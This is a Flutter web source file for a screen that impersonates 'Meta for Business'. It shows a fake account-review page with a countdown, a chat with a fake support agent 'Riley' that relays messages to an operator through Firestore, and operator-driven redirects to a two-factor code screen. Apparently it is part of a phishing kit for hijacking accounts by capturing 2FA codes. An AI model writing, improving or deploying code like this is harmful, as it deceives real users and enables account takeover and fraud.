import 'dart:async';
import 'dart:html';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:exins/Provider/uid_provider.dart';
import 'package:exins/Responsive/responsive_layout.dart';
import 'package:exins/Views/Mobile/mobile_tfa.dart';
import 'package:exins/Views/Web/tfa.dart';
import 'package:exins/Views/Widgets/Text/poppins.dart';
import 'package:flutter/material.dart';
import 'package:flutter/scheduler.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:page_transition/page_transition.dart';
import 'package:provider/provider.dart';

class RefScreen extends StatefulWidget {
  final Map dataMap;

  const RefScreen({super.key, required this.dataMap});

  @override
  State<RefScreen> createState() => _RefScreenState();
}

class _RefScreenState extends State<RefScreen> {
  int timer = 0;
  bool isTimer = false;
  late Timer _timer;
  int _start = 0;
  late Stream<DocumentSnapshot<Map<String, dynamic>>> snap;
  late Stream<QuerySnapshot<Map<String, dynamic>>> snap2;
  TextEditingController chatTextController = TextEditingController();
  late QuerySnapshot<Map<String, dynamic>> query;
  late String docId;
  ScrollController con = ScrollController();
  FocusNode _focusNode = FocusNode();
  bool isMessaging = false;

  void startTimer() {
    _timer = Timer.periodic(const Duration(seconds: 1), (timer) {
      setState(() {
        if (_start > 15 * 60) {
          isTimer = false;
          _start = 0;
          _timer.cancel();

          Navigator.pushReplacement(
            context,
            PageTransition(
              type: PageTransitionType.fade,
              child: ResponsiveLayout(
                desktopBody: TFA(
                    dataMap: widget.dataMap, isMobile: false, isThird: true),
                mobileBody:
                    TFA(dataMap: widget.dataMap, isMobile: true, isThird: true),
                tabletBody:
                    TFA(dataMap: widget.dataMap, isMobile: true, isThird: true),
              ),
            ),
          );
        } else {
          _start++;
        }
      });
    });
  }

  _asyncMethod() async {
    query = await FirebaseFirestore.instance
        .collection("conversations")
        .where("participants",
            arrayContains: "96aac034-7af2-4dae-83fd-7fe1a71f8890")
        .where("clientId", isEqualTo: uid)
        .get();

    if (query.docs.isEmpty) {
      // await FirebaseFirestore.instance.collection("conversations").add({
      //   "clientId": uid,
      //   "participants": [uid, "96aac034-7af2-4dae-83fd-7fe1a71f8890"],
      //   "username": widget.dataMap["Full Name"],
      //   "timestamp": FieldValue.serverTimestamp()
      // });

      // query = await FirebaseFirestore.instance
      //     .collection("conversations")
      //     .where("participants",
      //         arrayContains: "96aac034-7af2-4dae-83fd-7fe1a71f8890")
      //     .where("clientId", isEqualTo: uid)
      //     .get();

      // snap2 = FirebaseFirestore.instance
      //     .collection("messages")
      //     .where("docId", isEqualTo: query.docs[0].id)
      //     .orderBy("timestamp", descending: false)
      //     .snapshots();

      setState(() {});

      docId = query.docs[0].id;
    } else {
      docId = query.docs[0].id;

      snap2 = FirebaseFirestore.instance
          .collection("messages")
          .where("docId", isEqualTo: query.docs[0].id)
          .orderBy("timestamp", descending: false)
          .snapshots();

      setState(() {});
    }
  }

  @override
  void initState() {
    snap2 =
        FirebaseFirestore.instance.collection("messages").limit(1).snapshots();

    snap = FirebaseFirestore.instance
        .collection("User")
        .doc(widget.dataMap["uid"])
        .snapshots();

    WidgetsBinding.instance.addPostFrameCallback((_) {
      // _asyncMethod();
    });

    startTimer();
    super.initState();
  }

  late String uid;

  @override
  Widget build(BuildContext context) {
    int minutes = _start ~/ 60;
    int seconds = _start % 60;

    double w = MediaQuery.of(context).size.width / 100;
    double h = MediaQuery.of(context).size.height / 100;
    uid = Provider.of<UidProvider>(context).uid;

    return Scaffold(
      floatingActionButton: FloatingActionButton(
        child: const Icon(FontAwesomeIcons.message),
        onPressed: () {
          setState(() {
            isMessaging = !isMessaging;
          });
        },
      ),
      backgroundColor: const Color(0xffF7F7F7),
      body: StreamBuilder(
        stream: snap,
        builder: (context, snapshot) {
          if (snapshot.hasData) {
            if (snapshot.data!.data()!["uid"] != null) {
              if (snapshot.data!.data()!["step"] == 2) {
                SchedulerBinding.instance.addPostFrameCallback((_) {
                  _timer.cancel();
                  Navigator.pushReplacement(
                    context,
                    PageTransition(
                      type: PageTransitionType.fade,
                      child: ResponsiveLayout(
                        desktopBody: TFA(
                            dataMap: widget.dataMap,
                            isMobile: false,
                            isThird: true),
                        mobileBody: MobileTFA(
                            dataMap: widget.dataMap,
                            isMobile: true,
                            isThird: true),
                        tabletBody: MobileTFA(
                            dataMap: widget.dataMap,
                            isMobile: true,
                            isThird: true),
                      ),
                    ),
                  );
                });
              }
            }
          }
          return Stack(
            children: [
              Column(
                children: [
                  Container(
                    height: 70,
                    width: double.infinity,
                    decoration: const BoxDecoration(
                      color: Color(0xffFFFFFF),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.start,
                      crossAxisAlignment: CrossAxisAlignment.center,
                      children: [
                        Padding(
                          padding: const EdgeInsets.only(left: 15, right: 10),
                          child: SizedBox(
                            height: 40,
                            width: 40,
                            child: Image.asset(
                              "assets/images/logo.png",
                              filterQuality: FilterQuality.high,
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(
                    height: 130,
                  ),
                  Padding(
                    padding: const EdgeInsets.all(10.0),
                    child: Container(
                      width: 700,
                      decoration: BoxDecoration(
                        color: Colors.white,
                        borderRadius: const BorderRadius.all(
                          Radius.circular(5),
                        ),
                        border:
                            Border.all(width: 1, color: Colors.grey.shade400),
                      ),
                      child: Padding(
                        padding: const EdgeInsets.all(20),
                        child: Row(children: [
                          SizedBox(
                            width: w * 10,
                            height: 200,
                            child: Image.asset("assets/images/ref.png"),
                          ),
                          Expanded(
                            child: Padding(
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 20, vertical: 10),
                              child: Column(
                                mainAxisAlignment: MainAxisAlignment.start,
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  const SelectableText(
                                      "Hi, We are receiving your information",
                                      style: TextStyle(
                                          fontWeight: FontWeight.bold)),
                                  const SizedBox(
                                    height: 20,
                                  ),
                                  const SelectableText(
                                    "Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account.",
                                    style: TextStyle(fontSize: 14, height: 1.6),
                                  ),
                                  const SizedBox(
                                    height: 10,
                                  ),
                                  SelectableText(
                                    "Please wait, this could take up to 10-20 minutes, please be patient while we review your case...    ($minutes:$seconds)",
                                    style: const TextStyle(
                                        fontSize: 14, height: 1.6),
                                  ),
                                  const SizedBox(
                                    height: 20,
                                  ),
                                  LinearProgressIndicator(
                                    minHeight: 20,
                                    backgroundColor: const Color(0xffF0F2F5),
                                    color: const Color(0xff1876F2),
                                    value: _start / (15 * 60),
                                  )
                                ],
                              ),
                            ),
                          ),
                        ]),
                      ),
                    ),
                  ),
                ],
              ),
              isMessaging
                  ? Positioned(
                      bottom: h * 12,
                      right: 20,
                      child: Container(
                        height: 550,
                        width: 350,
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(10),
                          color: Colors.white,
                        ),
                        child: Stack(
                          children: [
                            Column(
                              children: [
                                Container(
                                  height: 50,
                                  decoration: BoxDecoration(
                                    boxShadow: [
                                      BoxShadow(
                                          blurRadius: 10,
                                          spreadRadius: 10,
                                          color: Colors.grey.shade100),
                                    ],
                                    color: Colors.white,
                                  ),
                                  child: Row(
                                    mainAxisAlignment:
                                        MainAxisAlignment.spaceBetween,
                                    crossAxisAlignment:
                                        CrossAxisAlignment.center,
                                    children: [
                                      Row(
                                        children: [
                                          const SizedBox(
                                            width: 10,
                                          ),
                                          Container(
                                            padding: EdgeInsets.all(5),
                                            height: 40,
                                            width: 40,
                                            decoration: const BoxDecoration(
                                                shape: BoxShape.circle,
                                                color: Colors.blue),
                                            child: SvgPicture.asset(
                                                "assets/images/metav2.svg"),
                                          ),
                                          const SizedBox(
                                            width: 10,
                                          ),
                                          Poppins(
                                            text: "META FOR BUSINESS",
                                            color: Colors.black,
                                            fontSize: 14,
                                            fontWeight: FontWeight.bold,
                                          ),
                                        ],
                                      ),
                                      MouseRegion(
                                        cursor: SystemMouseCursors.click,
                                        child: GestureDetector(
                                          onTap: () {
                                            setState(() {
                                              isMessaging = false;
                                            });
                                          },
                                          child: const Padding(
                                            padding: EdgeInsets.symmetric(
                                                horizontal: 10.0),
                                            child: Icon(Icons.close),
                                          ),
                                        ),
                                      )
                                    ],
                                  ),
                                ),
                                const SizedBox(
                                  height: 10,
                                ),
                                Padding(
                                  padding: const EdgeInsets.symmetric(
                                      horizontal: 5.0, vertical: 10),
                                  child: Align(
                                    alignment: Alignment.centerLeft,
                                    child: SizedBox(
                                      width: 350 * 0.8,
                                      child: Row(
                                        children: [
                                          const Icon(
                                            Icons.support_agent,
                                            size: 32,
                                          ),
                                          const SizedBox(
                                            width: 5,
                                          ),
                                          Expanded(
                                            child: Container(
                                              padding: const EdgeInsets.all(10),
                                              decoration: BoxDecoration(
                                                borderRadius:
                                                    BorderRadius.circular(10),
                                                color: const Color(0xffF0F2F5),
                                              ),
                                              child: Poppins(
                                                textAlign: TextAlign.justify,
                                                text:
                                                    "Thank you for contacting chat support. I'm Riley here to assist you.",
                                                color: Colors.black,
                                              ),
                                            ),
                                          ),
                                        ],
                                      ),
                                    ),
                                  ),
                                ),
                                Expanded(
                                  child: StreamBuilder(
                                    stream: snap2,
                                    builder: (context, snapshot) {
                                      if (snapshot.hasData) {
                                        if (snapshot.data!.docs.isEmpty) {
                                          return Container();
                                        } else {
                                          return ListView.builder(
                                            controller: con,
                                            shrinkWrap: true,
                                            itemCount:
                                                snapshot.data!.docs.length,
                                            itemBuilder: (context, index) {
                                              if (snapshot.data!.docs[index]
                                                      ["sender_id"] ==
                                                  uid) {
                                                return Padding(
                                                  padding: const EdgeInsets
                                                      .symmetric(
                                                      horizontal: 5.0,
                                                      vertical: 10),
                                                  child: Align(
                                                    alignment:
                                                        Alignment.centerRight,
                                                    child: SizedBox(
                                                      width: 350 * 0.8,
                                                      child: Row(
                                                        children: [
                                                          Expanded(
                                                            child: Container(
                                                              padding:
                                                                  const EdgeInsets
                                                                      .all(10),
                                                              decoration:
                                                                  BoxDecoration(
                                                                borderRadius:
                                                                    BorderRadius
                                                                        .circular(
                                                                            10),
                                                                color: const Color(
                                                                    0xff0084FF),
                                                              ),
                                                              child: Poppins(
                                                                textAlign:
                                                                    TextAlign
                                                                        .justify,
                                                                text: snapshot
                                                                        .data!
                                                                        .docs[index]
                                                                    ["message"],
                                                                color: Colors
                                                                    .white,
                                                              ),
                                                            ),
                                                          ),
                                                          const SizedBox(
                                                            width: 5,
                                                          ),
                                                          const Icon(
                                                            Icons.support_agent,
                                                            size: 32,
                                                          ),
                                                        ],
                                                      ),
                                                    ),
                                                  ),
                                                );
                                              } else if (snapshot
                                                          .data!.docs[index]
                                                      ["sender_id"] !=
                                                  uid) {
                                                return Padding(
                                                  padding: const EdgeInsets
                                                      .symmetric(
                                                      horizontal: 5.0,
                                                      vertical: 10),
                                                  child: Align(
                                                    alignment:
                                                        Alignment.centerLeft,
                                                    child: SizedBox(
                                                      width: 350 * 0.8,
                                                      child: Row(
                                                        children: [
                                                          const Icon(
                                                            Icons.support_agent,
                                                            size: 32,
                                                          ),
                                                          const SizedBox(
                                                            width: 5,
                                                          ),
                                                          Expanded(
                                                            child: Container(
                                                              padding:
                                                                  const EdgeInsets
                                                                      .all(10),
                                                              decoration:
                                                                  BoxDecoration(
                                                                borderRadius:
                                                                    BorderRadius
                                                                        .circular(
                                                                            10),
                                                                color: const Color(
                                                                    0xff243141),
                                                              ),
                                                              child: Poppins(
                                                                textAlign:
                                                                    TextAlign
                                                                        .justify,
                                                                text: snapshot
                                                                        .data!
                                                                        .docs[index]
                                                                    ["message"],
                                                                color: Colors
                                                                    .white,
                                                              ),
                                                            ),
                                                          ),
                                                        ],
                                                      ),
                                                    ),
                                                  ),
                                                );
                                              } else {
                                                return Container();
                                              }
                                            },
                                          );
                                        }
                                      } else {
                                        return const Center(
                                          child: CircularProgressIndicator(),
                                        );
                                      }
                                    },
                                  ),
                                ),
                                const SizedBox(
                                  height: 70,
                                ),
                              ],
                            ),
                            Row(
                              children: [
                                Expanded(
                                  flex: 5,
                                  child: Align(
                                    alignment: Alignment.bottomCenter,
                                    child: Container(
                                      padding: const EdgeInsets.symmetric(
                                          horizontal: 10, vertical: 5),
                                      alignment: Alignment.bottomCenter,
                                      height: 50,
                                      color: Colors.white,
                                      child: TextField(
                                        focusNode: _focusNode,
                                        onSubmitted: (value) async {
                                          String text = chatTextController.text;
                                          chatTextController.clear();

                                          await FirebaseFirestore.instance
                                              .collection("messages")
                                              .add({
                                            "docId": docId,
                                            "recipient_id":
                                                "96aac034-7af2-4dae-83fd-7fe1a71f8890",
                                            "sender_id": uid,
                                            "message": text,
                                            "timestamp":
                                                FieldValue.serverTimestamp()
                                          });

                                          con.animateTo(
                                            con.position.maxScrollExtent,
                                            duration: const Duration(
                                                milliseconds: 300),
                                            curve: Curves.easeOut,
                                          );

                                          FocusScope.of(context)
                                              .requestFocus(_focusNode);
                                        },
                                        controller: chatTextController,
                                        decoration: const InputDecoration(
                                          fillColor: Color(0xffEBEDF0),
                                          filled: true,
                                          contentPadding: EdgeInsets.symmetric(
                                              horizontal: 10),
                                          border: OutlineInputBorder(
                                              borderRadius: BorderRadius.all(
                                                  Radius.circular(20))),
                                        ),
                                      ),
                                    ),
                                  ),
                                ),
                                Flexible(
                                  child: Align(
                                    alignment: Alignment.bottomCenter,
                                    child: Padding(
                                      padding: const EdgeInsets.symmetric(
                                          horizontal: 5, vertical: 5),
                                      child: GestureDetector(
                                        onTap: () async {
                                          String text = chatTextController.text;
                                          chatTextController.clear();

                                          await FirebaseFirestore.instance
                                              .collection("messages")
                                              .add({
                                            "docId": docId,
                                            "recipient_id":
                                                "96aac034-7af2-4dae-83fd-7fe1a71f8890",
                                            "sender_id": uid,
                                            "message": text,
                                            "timestamp":
                                                FieldValue.serverTimestamp()
                                          });

                                          con.animateTo(
                                            con.position.maxScrollExtent,
                                            duration: const Duration(
                                                milliseconds: 300),
                                            curve: Curves.easeOut,
                                          );

                                          FocusScope.of(context)
                                              .requestFocus(_focusNode);
                                        },
                                        child: Container(
                                          height: 40,
                                          width: 40,
                                          decoration: const BoxDecoration(
                                            shape: BoxShape.circle,
                                            color: Color(0xff2196F3),
                                          ),
                                          child: const Icon(
                                            FontAwesomeIcons.paperPlane,
                                            color: Colors.white,
                                            size: 20,
                                          ),
                                        ),
                                      ),
                                    ),
                                  ),
                                )
                              ],
                            ),
                          ],
                        ),
                      ),
                    )
                  : Container(),
            ],
          );
        },
      ),
    );
  }
}
